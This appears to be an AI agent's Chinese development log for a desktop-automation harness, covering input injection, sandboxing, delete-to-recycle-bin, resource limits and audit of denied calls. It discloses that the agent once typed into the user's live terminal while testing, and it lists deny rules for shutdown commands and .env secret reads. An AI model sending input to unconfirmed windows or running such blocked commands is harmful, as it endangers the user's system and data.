成功率从 5/10 提升到 **8/12**；剩余失败如实返回：

    focus_failed: Windows refused to raise that window. Click it once yourself,
    then retry (foreground lock blocks background processes).

不假装成功，也不算「工具坏了」——手工点一下目标窗口再重试即可。

### 最终耗时

| 步骤 | 耗时 |
|---|---|
| `desktop_windows`（热态） | 48 ms |
| `focus` | 32 ms |
| `desktop_snapshot` | 15–27 ms |
| `sequence`（3×60ms wait） | 479 ms |
| **4 次调用合计** | **627–983 ms** |

序列的 479ms 里有 180ms 是显式 wait、150ms 是步间 50ms 间隔——逻辑开销约 150ms。

### 过程中踩到的两个 PowerShell 坑

- `[ref]([uint32]0)` 不是合法语法，必须先 `$var = [uint32]0` 再 `[ref]$var`；
- 反引号续行 + 跨行括号在 `ParseInput` 下报「缺少 )」，改成先拼接变量再传参。

两处都用 `Parser::ParseInput` 静态校验过（`PARSE_OK`）才继续。这类错误只在
worker 启动时暴露成「process closed unexpectedly」，从 stderr 里看不到原因，
所以静态解析比反复试跑更快。

### 验证方式

全部只做**只读**操作 + 切窗：列窗口、切窗口、快照、只含 `wait` 的序列。
**没有注入任何真实键鼠输入**——点击、键盘、文本输入仍需人按验收表逐项确认
（`docs/FEISHU_ACCEPTANCE.md` D1–D15）。

测试：`test_desktop_windows_tool` 11、`test_desktop_control_windows` 44。
全量 2178 passed / 3 skipped，ruff 通过。
## 真实键鼠验收：发现并修掉 SendInput 结构大小缺陷（2026-10-26）

之前所有桌面测试都注入 fake runner，**真实键鼠一次都没跑过**。这轮在真实窗口上
验证，立刻暴露一个「测试全绿但功能全废」的缺陷。

### 关键缺陷：INPUT 结构少 8 字节，SendInput 全部失败

第一次真实 `type` 就报：

    Unicode(...) 异常：SendInput failed

用独立探针测结构大小：

    sizeof=32  sent=0  err=87   ← ERROR_INVALID_PARAMETER

64 位下 `INPUT` 应该是 **40 字节**：`type`(4) + 对齐填充(4) + union(32)。而
`INPUTUNION` 只声明了一个 24 字节的 `KEYBDINPUT`，union 于是只有 24 字节，
整个 `INPUT` 变成 32 —— `SendInput` 认为结构不对，直接返回 0。

**为什么之前没发现**：`tests/test_desktop_control_windows.py` 的 44 条测试全部
注入 fake runner，脚本只做字符串断言。真实的 `SendInput` 调用一次都没执行过。

修法：`INPUTUNION` 显式 `Size = 32`，并补上 `MOUSEINPUT` / `HARDWAREINPUT`
（union 成员必须覆盖最大的那个）。修后探针 `size=40 sent=1`。

补了两条测试锁住：一条用真实 PowerShell 断言 `Marshal.SizeOf == 40`，
一条断言脚本里有 `Size = 32` 与 `MOUSEINPUT` 声明。

### 真实验证结果

全部在真实窗口上执行，用截图 + OCR 自证：

| 操作 | 耗时 | 结果 |
|---|---|---|
| `type` 输入 `echo HARNESS_KEYBOARD_OK` | 154 ms | ✅ |
| `key=enter` 执行 | 93 ms | ✅ 命令输出可见 |
| `sequence`（type + enter，一次审批） | 299 ms | ✅ |
| `key=ctrl+a` 组合键 | 81 ms | ✅ |
| `move` 鼠标移动 | 110 ms | ✅ |
| 截屏 + OCR 验证回显 | ~1.5 s | ✅ 文本匹配 |

中文、emoji、引号、PowerShell 元字符（`$(...)`、反引号、`|`、`>`）在**剪贴板**
往返里 7/7 全部一致（原值备份后已恢复）。

### 顺带确认的两个限制

**Windows 前台锁**：后台进程 `SetForegroundWindow` 约一半会被拒。补了
`AttachThreadInput` + `BringWindowToTop`，成功率 5/10 → 8/12；剩余失败返回明确
指引（让用户手动点一下窗口再重试），不假装成功。这轮真实验证时也确实遇到过
一次：`focus` 报告成功但快照显示前台仍是原窗口，靠「切完再快照核对」才确认。

**Store 版记事本**：`Start-Process notepad` 后进程立刻消失（Windows 11 的
notepad 是 Store 应用，外壳进程与窗口进程不同）。验收时用 `cmd /k title ...`
或独立 PowerShell 窗口更可靠。

### 验证边界

- 真实键鼠**只在自建的临时窗口**上执行（`cmd /k title HARNESS-TARGET`），
  输入的是 `echo` 类无害命令，没有碰任何真实文档或账号。
- 验证完的窗口已关闭，剪贴板原值已恢复。
- 仍然**没有**在真实业务窗口（浏览器、编辑器、聊天工具）上验证过输入——
  那需要按 `docs/FEISHU_ACCEPTANCE.md` D1–D15 由人逐项确认。

### 当前真实延迟（热态）

| 操作 | p50 |
|---|---|
| `desktop_windows` | 48 ms |
| `desktop_snapshot` | 15–27 ms |
| `focus` | 32 ms |
| `type` / `key` | 81–154 ms |
| `sequence`（2 步） | 299 ms |
| 剪贴板读/写往返 | 12–224 ms |
## 安全防护真机验证 + 一次真实事故（2026-10-26）

### 先说事故

验证审计留痕时，我直接调 `tool_desktop.action('type', ...)` 往「当前前台窗口」输入了
一个 `x`。当时前台**是用户正在用的终端**——等于往他的 shell 里敲了个字符。

没造成损害（单个 `x`，shell 忽略），但这是明确的操作失误：**测试输入不该打在无法
确认目标的窗口上**。对比之下，之前所有键鼠测试都先在自建窗口
（`cmd /k title HARNESS-XXXX`）里跑，那才是正确做法。

由此补了一个缺失的防护——见下面第 3 条。

### 三项防护的真机验证结果

**1. 序列中途切窗 → 正确中止（验证通过）**

这个验证一开始「失败」了三次，原因都在**测试方法**而不是产品：

- 干扰线程调 `focus_window` 时，它和序列**共用同一个 worker**，请求串行排队，
  等序列跑完才执行——所以干扰永远迟到；
- 用独立 PowerShell 进程 `AppActivate` 才真正插进去。

正确验证结果（干扰在 687ms 插入，序列第 2 步的 2500ms wait 期间）：

    ok=False  error=foreground_changed  step=3  已完成=2/3
    message=step 3/3 (wait): foreground window changed; re-snapshot

**报告准确的步号与已完成步数**，第 3 步没有执行。防护是对的。

**2. 敏感窗口拦截（验证通过）**

建了一个标题含 `Password Login` 的窗口：

    sensitive_target=True
    type -> ok=False  error=sensitive_target
    message=desktop input is blocked on a password or sensitive window

**3. 终端窗口防护（新增，验证通过）**

终端是最危险的目标：敲进去的任何字符都会被当命令执行，而它的标题通常**不含**
「密码」这类敏感词，原来的敏感词匹配抓不到。这正好是我踩到那个坑的原因。

新增 `is_terminal` 判定（进程名 + 窗口类名，覆盖 WindowsTerminal / cmd /
powershell / pwsh / conhost / mintty / WSL / ConEmu），并对 **type / key**
（含序列里含这两类的）默认拒绝：

    terminal_input: typing into a terminal window would run commands;
    re-send with allow_terminal=true after confirming the window

`move`/`click`/`scroll` 不受影响——点一下终端去选中文字是正常需求。
显式 `allow_terminal=true` 才放行，且必须由调用方逐次传入。

### 审计留痕的一个缺口

验证时发现 `desktop_list_windows` 与 `desktop_focus` **没有登记进
`AUDIT_EVENTS` 白名单**，所以审计里查不到「它列过哪些窗口、切过哪个窗口」——
新功能加了，审计没跟上。已补齐三个事件（含 `desktop_focus_failed`），
并按既有口径裁剪字段：窗口标题**不进**审计流，只记 count/total/pid/window_id。

### 验证方式与边界

- 键鼠只打在自建临时窗口（`cmd /k title HARNESS-*`）上，输入的是 `echo` 类命令；
- 唯一一次例外就是开头那件事，已记录并补了防护；
- 临时窗口全部关闭，当前窗口列表里没有残留；
- 仍**没有**在真实业务窗口（浏览器/编辑器/聊天工具）验证输入——那要人按
  `docs/FEISHU_ACCEPTANCE.md` D1–D15 逐项确认。

测试：`test_desktop_control_windows` 50（+4 终端防护）、`test_audit` 13（+2）。
全量 2187 passed / 3 skipped，ruff 通过。
## D2 落地：可撤销删除（回收站）

路线图里「D2 删除不进回收站」是剩下的缺口里**唯一会造成真实数据损失**的一项：
模型看错目标、路径拼错、glob 多匹配一个文件，用户就没有第二次机会。回收站是
操作系统本来就有的安全网，没理由不用。

### 设计

**`src/trash.py`（能力层）**

- Windows：`SHFileOperationW` + `FOF_ALLOWUNDO`，走系统回收站。`ctypes` 直调
  shell32，零依赖。带 `FOF_NOCONFIRMATION | FOF_SILENT | FOF_NOERRORUI`——
  否则每个文件弹一个确认框会把非交互会话卡住。
- 其他平台：`trash-put` / `trash` / `gio trash`。**找不到就明确失败**，不退回
  `unlink`——静默降级等于把安全网换成陷阱。
- 多个路径一次调用（Windows 支持列表），让「部分成功」这种中间态没机会出现。
- 拒绝文件系统根与盘符根：它们进不了回收站，也不该被删。
- `SHFileOperationW` 的错误码翻成人话（`0x20` → "file in use"、
  `0x2E` → "in use by another process"），比裸 errno 好查得多。

**`src/tool_delete.py` + `delete_paths` 工具**

- 只负责格式化与审计（`delete_trashed{count, method, paths}` /
  `delete_failed{count, reason}`）。
- 结果里明确告诉模型「已进回收站、可恢复」，让它能如实转告用户。

**策略层**

- `delete_paths` 归入 `DELETE_TOOLS`，三档下都 `ASK`——可撤销不等于不用问：
  一个 glob 展开可能就是 20 个文件。
- 加入 `SCHEDULED_FORBIDDEN_TOOLS`（定时任务不能删）、子代理排除、恢复分类
  `DESTRUCTIVE`（不自动重试）。
- 审批面逐条列出**每个**目标（超过 20 条折叠），而不是只写「删 1 个文件」。

### 与 bash 的关系

**没有**试图把 `bash` 里的 `del` / `rm` 改写进回收站。bash 是自由文本执行，
可靠改写需要完整 shell 解析器——那是另一个量级的工程，而且解析失败时会静默
退化成真实删除，比现在更危险。

替代做法：工具描述里明确写「优先用 `delete_paths` 而不是 `del`/`rm`，后者不可
恢复」。这是引导而非强制，但比假装能拦截诚实。

### 真实验证

- 删除文件与目录 → 都进了回收站（用 `Shell.Application` 查回收站确认，
  原路径正确、可恢复）；
- 文件被占用 → `SHFileOperation failed (code 0x20): a sharing violation occurred`；
- 不存在的路径 → `path does not exist`；
- 端到端：策略 `ASK` → 审批文案列出目标 → 工具输出「Moved 2 item(s) to the
  Recycle Bin (restorable)」；
- `/status` 显示「可撤销删除：可用（Windows 回收站）」。

测试：`tests/test_trash.py` 19 条，覆盖能力层（真实删除文件/目录、缺失路径、
根目录拒绝、单字符串输入）、工具层（格式化、失败不抛、空列表、审计失败隔离）、
策略边界（三档都 ASK、定时禁止、子代理排除、恢复分类）、审批面（逐条列出、
超长折叠）。

全量 2206 passed / 3 skipped，ruff 通过。

### 未做

- `bash` 的 `del`/`rm` 没有接管（理由见上）；
- 没有「列出回收站 / 从回收站恢复」的入口——`delete_paths` 只负责删，
  恢复仍由用户在系统里操作。真要补，恢复需要记下每个文件的回收站路径。
- `remove_worktree` 仍是破坏性删除（git 的 worktree 语义不同，没动）。
## OS 沙箱开销测量：数据与建议（2026-10-26）

H1（资源限额）想落地就得先决定「要不要把 `HARNESS_OS_SANDBOX` 默认打开」，
因为 Job Object 只在沙箱路径里创建。先测量，再决定。

工具：`scripts/bench_sandbox.py`（新），四次跑取稳定值。

### 1. 执行开销：几乎没有

| 命令 | off p50 | auto p50 | 差值 |
|---|---|---|---|
| `echo hi` | 23.6 ms | 23.4 ms | −1% |
| `python -c "print(1)"` | 79.3 ms | 70.5 ms | −11% |
| `dir /b` | 18.0 ms | 19.5 ms | +8% |

三次重复测量里差值在 **−11% ~ +28%** 之间波动，正负都有——**沙箱的固定开销落在
噪声里**。合理解释：`spawn_shell` 走的是 `CreateProcessAsUser` + Low 令牌，
本来就要建进程，多一个令牌句柄和 Job Object 是微秒级操作；真实成本在进程启动
（20–80ms），沙箱那层看不见。

结论：**性能不是阻止默认开启的理由。**

### 2. 一次性副作用：17–26ms，可接受

首次对某工作区启用时 `_ensure_workspace` 要打 Low 完整性标签，实测 17–26 ms，
之后按工作区缓存（再次调用 0.0 ms）。

代价是**持久且不可撤销**的：目录被标 Low 后，切回 `off` 也不会还原。这不影响
`off` 档行为（下面第 3 条验证了），但意味着「试一下再关掉」会留下痕迹。
另外模块文档里已写明：此后任何 Low 完整性进程（如浏览器渲染进程）也能改这个
工作区——这是 Low IL 方案的固有代价。

### 3. 隔离效果：确实生效

| 模式 | 工作区外写入 | 工作区内写入 |
|---|---|---|
| `off` | exit=0，**成功** | 正常 |
| `auto` | exit=1，**被内核拒绝**（"拒绝访问。"） | 正常 |

这是全量测量里唯一真正证明「沙箱有用」的数据：同一台机器、同一命令，只改
`HARNESS_OS_SANDBOX`，工作区外写入从成功变成被拒。

### 4. Job Object 内存限额：仍然是空的

`_make_job()` 只设了 `KILL_ON_JOB_CLOSE`。`JOBOBJECT_EXTENDED_LIMIT_INFORMATION`
里的 `ProcessMemoryLimit` / `JobMemoryLimit` 字段存在，但没有对应的
`LimitFlags` 位（`JOB_OBJECT_LIMIT_PROCESS_MEMORY=0x100` /
`JOB_OBJECT_LIMIT_JOB_MEMORY=0x200`），**等于从未生效**。

### 测量过程中修掉的两个自己的坑

1. `spawn_shell` 的 stdout 参数要的是**真实文件对象**（沙箱路径取 `fileno()`
   交给 `CreateProcess`），我一开始传 `subprocess.PIPE` 直接 AttributeError。
   这是测量脚本的问题，不是产品 bug——`tool_exec` 传的是真文件对象。
2. 隔离对照必须用**完全独立的工作区**：打标是持久的，复用同一目录会让前一档
   污染后一档（我因此连续三次测出「off 也被拒」的假结果）。另外每档要先
   `sandbox.reset_cache()`，否则会沿用上一档缓存的状态判定。

### 建议

**建议默认 `auto`，但同时把话说清楚。**

支持开启：

- 性能开销在噪声内（−11% ~ +28%，正负都有），不构成理由；
- 唯一被验证有效的写入边界：工作区外写入从「成功」变成「内核拒绝」。策略层是
  提示级约束（模型可以被提示词绕过），这一层是内核级；
- `auto` 语义本来就是「能开就开，开不了警告后退回」，失败不会挡住命令。

反对 / 需要接受：

- **打标持久不可撤销**，且在 SACL 上，需要目录 WRITE_OWNER；模块会尝试给自己
  补一条 `(OI)(CI)(WO)` ACE——这是改自己的工作区权限，不改系统安全策略，但用户
  应该知道；
- **不隔离读取和网络**。不要把「开了沙箱」理解成「安全了」：读文件、发请求都
  不受限制，秘密文件仍然只靠策略层的路径分区；
- 工作区在 FAT/exFAT、网络盘、某些同步目录上不支持完整性标签，`auto` 会警告
  一次然后退回普通执行——那些环境下「看起来开了其实没开」。

**不建议**顺带做 H1 内存限额：它只在沙箱路径生效，而现在连「沙箱是否默认开」
都还没定；先开沙箱、观察一段时间，再决定限额阈值更有依据。硬编一个阈值
（比如 2 GB）很可能把 `npm install` 这类正常任务杀掉，反而制造新问题。

### 如果你决定开启

改一行：`src/sandbox.py` 的 `DEFAULT_MODE = 'auto'`。同时建议：

- `/status` 与 `--doctor` 已经显示沙箱状态，保持；
- 在 `docs/FEISHU_SETUP.md` 写清「沙箱管写入，不管读取与网络」；
- 给不支持完整性标签的文件系统加一条显式提示（现在只有一行 warn）。
## 沙箱性能优化：环境块缓存（2026-10-26）

上一轮测量结论是「沙箱开销在噪声内」，但那次只看端到端。这轮 profile 到函数级，
发现一处 38 倍的重复劳动。

### 定位过程

`cProfile` 按累计时间排序，每次 `spawn_shell` 的 Python 侧耗时分布：

| 环节 | 耗时 | 说明 |
|---|---|---|
| `wait()` | 18.5 ms | 命令本身的执行时间，不是沙箱开销 |
| `_create_process` | 4.2 ms | 沙箱真正的开销（CreateProcessAsUser + 令牌） |
| `_environment_block` | **1.4 ms** | 环境块重建 |

单独测 `_environment_block`：**435 µs**，而 `_low_token` 只有 17 µs。也就是
环境块比令牌贵 25 倍——它在遍历 `os.environ`、做大小写归一、构造排序字典、
拼一个大字符串、再拷进 `create_unicode_buffer`。这些在一个进程内**永远不会变**。

### 修法：按 (TEMP 目录, 环境指纹) 缓存

```python
_ENV_BLOCK_CACHE: dict[tuple[str, int], object] = {}
cache_key = (str(temp_dir), _environment_fingerprint())
```

- 缓存键带 `hash(frozenset(os.environ))`：进程内改了环境变量（测试 `setenv`、
  运行时切换配置）会自动失效，不会出现「沙箱里看不到新变量」。
- `reset_cache()` 一并清空，与既有的工作区状态缓存同生命周期。
- 上限 4 条：正常只有一两个工作区，超了整表清掉。

**435 µs → 11.3 µs（38 倍）。**

### 优化后对比（n=20，稳态）

| 命令 | off p50 | auto p50 | 差值 |
|---|---|---|---|
| `echo x` | 21.8 ms | 20.1 ms | −1.6 ms |
| `python -c` | 70.6 ms | 74.8 ms | +4.2 ms |
| `echo hi`（bench 脚本） | 23.5 ms | 23.6 ms | **+0.0 ms** |
| `dir /b` | 22.5 ms | 24.5 ms | +2.0 ms |

差值稳定落在 **−10% ~ +9%** 且正负都有，**沙箱开销已经不可测**。

隔离效果不变：off 写工作区外成功、auto 被内核拒绝（"拒绝访问。"）。

### 过程中自己引入又修掉的一个 bug

第一次加缓存后测了 200 次，`cProfile` 显示仍在重建。原因很蠢但值得记：

```python
key = (str(temp_dir), _environment_fingerprint())   # 缓存键
values = {key.upper(): ... }                        # ← 这里的推导变量也叫 key
for key in ('TEMP', 'TMP', 'TMPDIR'):               # ← 又把 key 冲掉了
    values[key] = ...
...
_ENV_BLOCK_CACHE[key] = block                       # ← 存成了 'TMPDIR'
```

缓存里实际躺着 `{'TMPDIR': block}`，每次查 `(path, fp)` 都未命中。变量改名
`cache_key` 后正常。**这种「缓存看着有但从不命中」的 bug，如果只看代码是看不
出来的，必须测「第二次调用是否同一对象」。** 新增的测试正是这么写的：

```python
assert sandbox._environment_block(tmp_path) is sandbox._environment_block(tmp_path)
```

### 测试

`tests/test_sandbox.py` 14 → 19 条，新增：
环境块缓存命中（同一对象）、改环境变量后失效、TEMP/TMP/TMPDIR 覆盖正确、
大小写不敏感排序、`reset_cache` 清空缓存。

全量 2211 passed / 3 skipped，ruff 通过。

### 还能优化吗

看了剩下的大头：`_create_process` 的 4.2 ms 是 `CreateProcessAsUserW` 系统调用
本身，绕不开（要沙箱就必须用它）；`_low_token` 17 µs，可以缓存令牌句柄，
但收益 0.07%，而且令牌跨进程复用要处理关闭时序，风险大于收益——**不做**。

真正的结论：**沙箱现在没有可测量的性能代价，开不开只取决于安全取舍**。
## 尝试默认开启 OS 沙箱，实测后回退（2026-10-27）

按上一轮测量的建议把 `DEFAULT_MODE` 改成 `auto`，然后在**本仓库作为工作区**的真实
场景下验证。结果发现三个问题，直接回退。

### 问题 1：沙箱在仓库根上自锁

`_prepare_workspace` 的顺序是「先 mkdir `.cache/sandbox-tmp`，再对整棵树 `/T` 打
Low」。新目录继承 Low 之后，`icacls` 自己（以 Low 运行）就再也改不动它：

    D:\harness-agent\.cache\sandbox-tmp: 拒绝访问。
    icacls rc=0  "已成功处理 0 个文件; 处理 1 个文件时失败"

于是 `_low_label(temp_dir)` 永远是 False，`_prepare_workspace` 每次都返回
「无法把沙箱临时目录标记为 Low」，沙箱降级回普通执行，还刷一行警告。
换句话说：**在仓库根上，auto 档等于永远不生效，但会一直吵**。

### 问题 2：打标是持久的，会影响日常使用

工作区根被打上 Low 后，`D:\harness-agent\docs` 也带了标签（实测 `low=True`）。
恢复要两步：先补 `WRITE_OWNER`，再 `/setintegritylevel (OI)(CI)M`：

    icacls docs /grant *<sid>:(OI)(CI)(WO)
    icacls docs /setintegritylevel (OI)(CI)M /T /C /Q

已执行并验证仓库全部恢复（`src`、`tests`、`docs`、`.cache`、`.git` 现在都是
`low=False`）。但这个过程本身说明：**用户不该为了试一个开关去修自己的目录权限**。

### 问题 3：收益与风险不匹配

性能代价确实不可测（上一轮环境块缓存后 off/auto 差值 −10% ~ +9%），但它只挡
「工作区外写入」，**不挡读取与网络**。默认打开会让用户误以为「安全了」，而秘密
文件仍然只靠策略层的路径分区。

### 回退内容

- `DEFAULT_MODE` 改回 `'off'`，并把上面三条写进代码注释，避免以后有人再试一次。
- 两个测试改回断言默认 `off`（`test_configured_mode_defaults_to_off`、
  `test_unknown_mode_is_off_not_a_silent_upgrade`）。
- 环境块缓存的优化**保留**（435µs → 11.3µs，那是纯粹的重复劳动，与档位无关）。

### 顺带查清的一件事

验证过程中 `echo data > out.txt` 在临时 cwd 里被判成 `outside_workspace_write`，
一度以为是沙箱引入的。实际原因：`harness.get_workdir()` 是 `D:\harness-agent`，
而我把 `cwd` 传成了临时目录——相对路径 `out.txt` 按 workdir 解析，自然判成越界。
**这是既有语义（cwd 与 workspace 不一致时的正确行为），不是回归。** 用真实工作区
重测后一切正常。

### 结论

沙箱保持默认 `off`。需要时显式 `HARNESS_OS_SANDBOX=auto`，且**工作区最好指向专门
的目录而不是仓库根**——那样问题 1、2 都不会发生。这一点已写进 `sandbox.py` 顶部
注释。

全量 2211 passed / 3 skipped，ruff 通过。
## H1 落地：进程资源限额（Job Object，不依赖沙箱）（2026-10-27）

`bash` 原本只有超时——管得住「卡住不动」，管不住「慢慢把内存吃光」。一个失控的
`npm install` 或递归脚本足以让桌面卡死，而超时到点前机器已经不能用了。

### 为什么不复用 sandbox 的 Job Object

`sandbox.py` 里已经有一个 Job Object，但它只设了 `KILL_ON_JOB_CLOSE`（防遗留
进程），语义不同；而且它只在 Low IL 沙箱路径创建，而沙箱默认 `off`。

上一轮试过把沙箱默认打开，实测后回退（见上一节）。所以这里做**独立的限额层**：

    sandbox（能不能写工作区外）  ─┐
                                  ├→ 各自独立开关，互不依赖
    limits （能用多少资源）      ─┘

### 能力层 `src/limits.py`

三类限额，都通过 `JOBOBJECT_EXTENDED_LIMIT_INFORMATION` 设置：

| 项 | LimitFlags | 默认 |
|---|---|---|
| 单进程内存 | `PROCESS_MEMORY` (0x100) | 2048 MB |
| 整组内存 | `JOB_MEMORY` (0x200) | 4096 MB |
| 进程数 | `ACTIVE_PROCESS` (0x008) | 64 |
| CPU 累计时间 | `JOB_TIME` (0x004) | 不限 |

默认值依据：2 GiB 过得去 `npm install` / 大型编译的单进程峰值，又能挡住「一次
分配几十 G」的失控；64 个进程给正常并发留余量，挡住 fork 炸弹。

**刻意不设 `KILL_ON_JOB_CLOSE`**：限额是护栏，不是生命周期管理。关句柄不该杀进程。

### 真实验证（不是看代码，是跑）

| 场景 | 结果 |
|---|---|
| 10 MB @ 256 MB 限额 | exit 0，成功 |
| 1 GB @ 256 MB 限额 | exit 1，`MemoryError` |
| 1 GB @ 不限额 | **exit 0，成功** |
| 起 20 进程 @ 5 进程限额 | 第 5 个 `OSError`，命令自己捕获 |
| 死循环 @ CPU 1s 限额 | exit `0xC0000044`（超时终止） |

第三行是关键对照：同一段代码在不限额时成功，说明确实是限额在起作用，不是巧合。

### 接入默认路径

限额挂在 `_popen_shell`（沙箱 `off` 时走的那条），所以**不依赖 Low IL 也能生效**。
句柄塞进 `proc.__dict__['_harness_job']`，由 `process_utils.close_process` 统一
关闭——那里是所有执行路径的收敛点。

失败一律降级：`CreateJobObject` 失败、`AssignProcessToJobObject` 失败、进程已经
退出，都只是「不限额，照常跑」。个人单机上「命令能跑」比「限额一定生效」重要；
限额本身是护栏，不是安全边界。

### 过程中踩到的栈溢出（真实事故）

接入后全量测试直接崩在 `Windows fatal exception: stack overflow`，报错栈指向
`threading.py` 和 `asyncio`，完全看不出跟限额有关。

根因：测试用 `Mock()` 替换 `subprocess.Popen`。Mock 对**任意属性**都返回一个新
Mock（不会 `AttributeError`），所以 `getattr(proc, '_harness_job', None)` 拿到一个
Mock；把它当内核句柄传给 `CloseHandle`，ctypes 一路递归到栈溢出。

修法两条，都在 `close_process` 里：

1. 用 `getattr(proc, '__dict__', {}).get(...)` 而不是 `getattr(proc, ...)`——
   Mock 的 `__dict__` 里没有就不返回；
2. 校验 `isinstance(job, int) and job`——内核句柄在 Python 里是整数。

`_popen_shell` 里也加了 `isinstance(proc, subprocess.Popen)` 守卫，避免对假进程
调 `limits.apply_to_process`。

补了两条回归测试：`test_close_process_tolerates_mock_process`（不崩、幂等）和
`test_close_process_closes_real_job_handle`（真句柄被关且从 proc 上摘掉）。

### 可观测与开关

- `/status` 与 `/status_line()` 显示当前限额；
- `HARNESS_LIMIT_MEMORY_MB` / `HARNESS_LIMIT_PROCESSES` / `HARNESS_LIMIT_CPU_SECONDS`
  调整，设 `0` 关闭对应项；非法值静默回落默认（护栏不该阻止启动）。

测试：`tests/test_limits.py` 17 条，覆盖环境解析、三类限额的真实约束、
失败降级、以及上面那个 Mock 事故。

全量 2226 passed / 3 skipped，ruff 通过。

### 未做

- 磁盘配额（`JOB_OBJECT_LIMIT_PROCESS_DISK` 等）没有接：语义复杂（按字节/
  按时间），而且个人单机上「磁盘满」通常由别的原因先暴露；
- 没有按命令类型给不同限额（比如给 `npm install` 更高的内存）——那需要先有
  真实的使用数据，现在硬编规则等于猜。

## 补齐 policy_denied 审计：被拒绝的调用现在能查到

`policy_denied` 在审计白名单（`audit.AUDIT_EVENTS`）里登记了很久，图标也配了，
但代码里**从来没有写入方**。结果是 `/audit` 能回答「放行了什么」，却答不了
「什么被挡住了」——而后者才是安全审计的主要用途：用户想知道有没有人（或模型）
试图做危险的事。

### 接入的六条拒绝路径

| 路径 | blocked_by | 例子 |
|---|---|---|
| 策略层硬拒 | `policy` | 黑名单 `shutdown`、秘密文件 `.env`、域名 deny |
| 定时回合禁用工具 | `background` | `delete_paths` 在只读定时任务里 |
| 定时回合只读复核 | `background` | 写文件被 read-only + never 折成 DENY |
| 后台读屏幕 | `background` | `screen_capture` 在非交互线程 |
| 后台读剪贴板 | `background` | `clipboard_read` |
| 后台控桌面 | `background` | `desktop_action` |

**`blocked_by` 是刻意区分的**：`policy` 是「你的规则拦了它」，`background` 是
「这条路径没法问人」。两者混在一起，用户会误以为自己的策略拦下了一条本来允许
的操作。

### 两个实现细节

1. **抽出 `_append_audit` 共用写入逻辑**。原本 `_record_auto_approval` 里有一份
   完整的「取会话 → 找文件 → append → 失败只打印」，现在两条审计事件共用它。
   少一份复制，也少一处忘记同步的机会。
2. **白名单要一并补齐**。第一次只写了事件，`/audit` 里却看不到 `blocked_by` 和
   `reason`——因为 `AUDIT_EVENTS['policy_denied']` 还只有 `('tool', 'code', 'zone')`。
   投影层按白名单裁字段，登记不全等于白写。补成
   `('tool', 'code', 'zone', 'reason', 'blocked_by', 'command')`。

### 真机验证

    bash        code=deny_pattern   by=policy      ← shutdown /s
    read        code=secret_path    by=policy      ← .env
    web_fetch   code=domain_denied  by=policy      ← 域名 deny
    screen_capture code=screen_access by=background ← 非交互回合
    delete_paths   code=delete_paths  by=background ← 定时任务

卡片渲染也分了两种措辞：策略拒绝显示 `工具 · 策略码 · 原因`，后台拒绝显示
`工具 · 策略码 · 后台/定时回合不可用`。

### 测试

`tests/test_policy_denied_audit.py` 9 条：三类策略硬拒、后台屏幕、定时删除、
放行不写事件、无会话静默、审计投影带出 `blocked_by`、卡片区分两种来源。

全量 2236 passed / 3 skipped（`test_turn_slot_released_after_turn` 是既有偶发，
单跑 3 次全过），ruff 通过。

## 第二轮 profile：两处漏掉的缓存（2026-10-27）

用 `scripts/profile_new_tools.py` + `cProfile` 复查，发现上次给 `rules.py` 加缓存
时漏了两个同类热点。

### 1. 域名账本每次调用都读盘

`cProfile` 显示 `hooks.evaluate_call` 的 107ms/200 次里，`net_grants.active_rules`
占 34ms，`_read` 内部有 3 次 `stat` + 1 次文件读 + JSON 解析。

`rules.py` 早就加了 `(路径, mtime_ns, size)` 缓存，`net_grants.py` 漏了——两个
模块结构几乎一样，改一个忘了另一个。

补上同样的缓存（含 `_CACHE_LOCK`、上限 8 条、`reset` 由 `conftest` 的隔离
fixture 负责路径）。**注意 `strict=True` 必须绕过缓存**：那条路径是修改前的
校验，必须看盘上真实内容。

效果：`evaluate_call(bash)` **2.8 ms → 0.30 ms（9 倍）**。

### 2. 审计预筛在文本层解码

上一轮给 `audit.collect` 加了正则预筛，但它是先用 `open(..., 'r')` 把每行
**解码成 str** 再跑正则。会话里 90% 是 message / tool_started，正文里几乎不出现
`"type"` 这个键——在 bytes 层就能挡掉，不必解码。

改成 `open(..., 'rb')` + `b'"type"' in raw` 再解码。实测 56 会话 3912 行：
全解码 41ms，字节预筛 29ms。

连同之前加的文件预算，`audit.collect` **178 ms → 37 ms（4.8 倍）**。

### 验证

- `evaluate_call(bash)` 300 次平均 0.296 ms；
- 改域名账本后**立即生效**（deny → allow 切换当场反映，证明 mtime 缓存没把
  旧值锁住）；
- 新增 2 条测试：`test_ledger_read_is_cached_until_the_file_changes`（同内容命中、
  改文件立即失效）、`test_strict_read_bypasses_cache`。

### 没动的

`audit.collect` 剩下的 37ms 主要是「读 56 个文件」本身，要再快就得建持久索引
（写时维护、跨进程一致性、损坏恢复）。按需查询 37ms 完全够用，**不做**。

全量 2239 passed / 3 skipped，ruff 通过。

## 功能完整性：终端侧补齐 /domains、/audit，规则可增删（2026-10-27）

飞书早就有 `/domains` 和 `/audit`，但 **CLI 与 TUI 都没有**——同样一台机器，
换个界面就找不到入口。另外 `/rules` 只能看，改规则得手编辑 YAML。

### 1. 抽出 `src/terminal_views.py`

CLI 和 TUI 都需要「域名策略」「最近审计」的纯文本渲染。一开始各写一份，很快
发现字段顺序和有效期措辞已经开始分叉（`有效至` vs `已过期`）。改成共享模块：

- `domains(argument) -> str`：解析 + 落盘 + 渲染，一次调用返回要显示的文本；
- `audit(argument, limit=50) -> str`：同上。

前端只负责把字符串 print / notice 出去，不再各写一份逻辑。飞书有自己的卡片
（`feishu_domain_card` / `feishu_audit_card`），不走这条路径——那是刻意的：
卡片要按钮和翻页，纯文本要一行一条，两者形态不同。

### 2. `/rules` 支持增删

`rules.add_rule` / `rules.remove_rule`：

- 同决策 + 同前缀 + 同工具 + 同作用域视为同一条，**替换而不是追加**（否则反复
  改一次 note 就多一条规则）；
- **文件损坏时拒绝写入**：直接覆盖等于丢掉用户写的全部规则，这比「改不进去」
  糟糕得多，所以显式报 `rules file is unusable`；
- `remove_rule` 支持按 `decision` 过滤（同一前缀可以同时有 allow 和 deny）。

CLI 侧 `/rules add allow "npm test" note 只读测试`、`/rules remove "npm test"`。

### 3. 顺带修的注册问题

`/rules` 原本在 `cli_commands` 里声明 `arguments=()`（不接受参数），所以带参数
调用会被 `command_error` 直接拦掉，连 handler 都没进。改成声明参数后才生效。

TUI 侧补了 `CommandSpec('domains', ..., ('domain',))` —— CLI 的 `/domain` 是别名，
TUI 缺它会让 `test_cli_commands_and_aliases_exist_in_tui` 失败。这条测试正是
为了让「两边命令面一致」这件事不会悄悄漂移。

### 验证

- `/domains allow *.example.com note docs` → 列表显示 `允许 *.example.com [永久]`；
